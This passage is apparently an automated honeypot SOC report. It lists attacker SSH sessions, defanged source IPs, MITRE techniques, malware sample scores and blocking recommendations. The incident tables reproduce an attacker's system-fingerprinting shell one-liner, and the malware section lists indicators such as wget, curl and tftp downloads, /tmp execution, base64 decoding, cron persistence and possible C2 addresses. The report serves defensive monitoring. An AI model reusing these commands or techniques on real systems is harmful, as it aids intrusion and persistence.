| `2026-09-07 20:29:34` | `cowrie.session.params` |
| `2026-09-07 20:29:34` | `cowrie.command.input` |
| `2026-09-07 20:29:34` | `cowrie.log.closed` |
| `2026-09-07 20:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1322982e716

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:29 |
| **Last Seen** | 2026-09-07 20:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:29:58` | `cowrie.session.connect` |
| `2026-09-07 20:29:58` | `cowrie.client.version` |
| `2026-09-07 20:29:58` | `cowrie.client.kex` |
| `2026-09-07 20:29:59` | `cowrie.login.success` |
| `2026-09-07 20:30:00` | `cowrie.session.params` |
| `2026-09-07 20:30:00` | `cowrie.command.input` |
| `2026-09-07 20:30:00` | `cowrie.log.closed` |
| `2026-09-07 20:30:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ac7c67b62dc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-07 20:40 |
| **Last Seen** | 2026-09-07 20:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:40:12` | `cowrie.session.connect` |
| `2026-09-07 20:40:13` | `cowrie.client.version` |
| `2026-09-07 20:40:13` | `cowrie.client.kex` |
| `2026-09-07 20:40:15` | `cowrie.login.success` |
| `2026-09-07 20:40:17` | `cowrie.session.params` |
| `2026-09-07 20:40:17` | `cowrie.command.input` |
| `2026-09-07 20:40:17` | `cowrie.log.closed` |
| `2026-09-07 20:40:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-481afba345e2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-07 20:42 |
| **Last Seen** | 2026-09-07 20:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:42:33` | `cowrie.session.connect` |
| `2026-09-07 20:42:33` | `cowrie.client.version` |
| `2026-09-07 20:42:33` | `cowrie.client.kex` |
| `2026-09-07 20:42:35` | `cowrie.login.success` |
| `2026-09-07 20:42:36` | `cowrie.session.params` |
| `2026-09-07 20:42:36` | `cowrie.command.input` |
| `2026-09-07 20:42:36` | `cowrie.log.closed` |
| `2026-09-07 20:42:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2aa0ee85787

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-07 20:44 |
| **Last Seen** | 2026-09-07 20:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:44:59` | `cowrie.session.connect` |
| `2026-09-07 20:44:59` | `cowrie.client.version` |
| `2026-09-07 20:44:59` | `cowrie.client.kex` |
| `2026-09-07 20:45:00` | `cowrie.login.success` |
| `2026-09-07 20:45:02` | `cowrie.session.params` |
| `2026-09-07 20:45:02` | `cowrie.command.input` |
| `2026-09-07 20:45:02` | `cowrie.log.closed` |
| `2026-09-07 20:45:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b690f011ea

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-07 20:45 |
| **Last Seen** | 2026-09-07 20:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:45:31` | `cowrie.session.connect` |
| `2026-09-07 20:45:31` | `cowrie.client.version` |
| `2026-09-07 20:45:31` | `cowrie.client.kex` |
| `2026-09-07 20:45:31` | `cowrie.login.success` |
| `2026-09-07 20:45:31` | `cowrie.direct-tcpip.request` |
| `2026-09-07 20:45:31` | `cowrie.direct-tcpip.data` |
| `2026-09-07 20:45:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcd0aac49d08

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-07 20:47 |
| **Last Seen** | 2026-09-07 20:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:47:16` | `cowrie.session.connect` |
| `2026-09-07 20:47:16` | `cowrie.client.version` |
| `2026-09-07 20:47:16` | `cowrie.client.kex` |
| `2026-09-07 20:47:17` | `cowrie.login.success` |
| `2026-09-07 20:47:18` | `cowrie.session.params` |
| `2026-09-07 20:47:18` | `cowrie.command.input` |
| `2026-09-07 20:47:19` | `cowrie.log.closed` |
| `2026-09-07 20:47:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6928ed7070

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-07 20:49 |
| **Last Seen** | 2026-09-07 20:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:49:30` | `cowrie.session.connect` |
| `2026-09-07 20:49:31` | `cowrie.client.version` |
| `2026-09-07 20:49:31` | `cowrie.client.kex` |
| `2026-09-07 20:49:32` | `cowrie.login.success` |
| `2026-09-07 20:49:33` | `cowrie.session.params` |
| `2026-09-07 20:49:33` | `cowrie.command.input` |
| `2026-09-07 20:49:34` | `cowrie.log.closed` |
| `2026-09-07 20:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cc483b33e85

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-07 20:53 |
| **Last Seen** | 2026-09-07 20:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:53:51` | `cowrie.session.connect` |
| `2026-09-07 20:53:51` | `cowrie.client.version` |
| `2026-09-07 20:53:51` | `cowrie.client.kex` |
| `2026-09-07 20:53:52` | `cowrie.login.success` |
| `2026-09-07 20:53:53` | `cowrie.session.params` |
| `2026-09-07 20:53:53` | `cowrie.command.input` |
| `2026-09-07 20:53:53` | `cowrie.log.closed` |
| `2026-09-07 20:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `66.132.195[.]89` | **4** | 2026-09-07 19:04 | 2026-09-07 19:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.232.44[.]201` | **3** | 2026-09-07 19:41 | 2026-09-07 20:11 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-09-07 19:42 | 2026-09-07 20:40 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `172.236.228[.]38` | **2** | 2026-09-07 19:08 | 2026-09-07 19:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | **2** | 2026-09-07 20:34 | 2026-09-07 20:51 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.236.228[.]211` | **2** | 2026-09-07 19:49 | 2026-09-07 19:49 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `73.232.161[.]61` | **2** | 2026-09-07 19:46 | 2026-09-07 19:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `119.96.81[.]99` | 1 | 2026-09-07 19:37 | 2026-09-07 19:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]177` | 1 | 2026-09-07 20:01 | 2026-09-07 20:01 | 36s | 0 | `T1592` | 🟢 LOW |
| `195.26.18[.]111` | 1 | 2026-09-07 19:33 | 2026-09-07 19:33 | 14s | 0 | `T1592` | 🟢 LOW |
| `217.60.255[.]130` | 1 | 2026-09-07 20:30 | 2026-09-07 20:30 | 8s | 0 | `T1592` | 🟢 LOW |
| `219.153.103[.]109` | 1 | 2026-09-07 19:53 | 2026-09-07 19:53 | 14s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-09-07 19:50 | 2026-09-07 19:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-09-07 19:08 | 2026-09-07 19:08 | 1s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-09-07 20:04 | 2026-09-07 20:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]39` | 1 | 2026-09-07 20:09 | 2026-09-07 20:09 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `172.236.228[.]38` | US | Linode | **100** ⚠️ | 50 |
| `62.60.130[.]201` | LT | CIPHER OPERATIONS DOO BEOGRAD - NOVI BEOGRAD | **100** ⚠️ | 50 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `155.94.233[.]59` | US | HostPapa | **100** ⚠️ | 5 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `80.94.92[.]234` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 0 |
| `160.250.93[.]239` | MY | Data Robot Resources | **100** ⚠️ | 5 |
| `193.32.162[.]84` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `195.26.18[.]111` | UA | Zeynalov Renat | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 194 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 179 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 8 |

---

## 🔕 False Positive Summary (32 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 20 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 220 cases |
| Tool 34  | Credential Extractor        | ✅ 212 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
